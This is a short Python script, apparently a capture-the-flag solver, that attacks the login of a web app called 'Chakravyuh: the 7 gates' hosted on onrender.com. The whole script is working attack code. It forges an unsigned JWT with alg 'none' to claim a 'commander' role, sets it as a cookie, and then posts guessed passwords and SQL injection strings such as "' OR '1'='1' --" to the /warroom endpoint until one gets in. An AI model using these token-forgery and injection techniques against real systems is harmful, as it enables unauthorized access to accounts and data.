import requests, json, base64, re

def b64url(d):
    if isinstance(d,str): d=d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def forge(role='commander', level=2, gates=[]):
    h=b64url(json.dumps({'alg':'none','typ':'JWT'}))
    p=b64url(json.dumps({'user':'abhimanyu','role':role,'access_level':level,'gates':gates}))
    return f'{h}.{p}.'

s=requests.Session()
s.cookies.set('chakravyuh_token',forge(),domain='chakravyuh-the-7-gates.onrender.com')

payloads = [
    ("ashwatthama", "ashwatthama"),
    ("ashwatthama", "brahmastra"),
    ("ashwatthama", "Brahmastra"),
    ("ashwatthama", "brahmastra2026"),
    ("ashwatthama", "Chakravyuh@Pandava2026"),
    ("drona", "drona"),
    ("drona", "brahmastra"),
    ("commander", "commander"),
    # SQLi
    ("ashwatthama' OR '1'='1", "x"),
    ("' OR '1'='1' --", "x"),
    ("ashwatthama' --", "x"),
    ("ashwatthama'/*", "x"),
    (" OR 1=1--", "x"),
    ("admin' OR '1'='1", "x"),
]

for u, pk in payloads:
    r = s.post('https://chakravyuh-the-7-gates.onrender.com/warroom',
        data={'username': u, 'passkey': pk}, timeout=12, allow_redirects=True)
    snippet = r.text[400:700].replace('\n',' ')
    print(f"[{r.status_code}] {u[:30]}/{pk[:20]} -> {r.url} | {snippet[:120]}")
    if 'scout' in r.url or ('gate' in r.text.lower() and 'granted' in r.text.lower() and 'gate 1' not in r.text.lower()):
        print("=== HIT ===")
        print(r.text[:3000])
        break
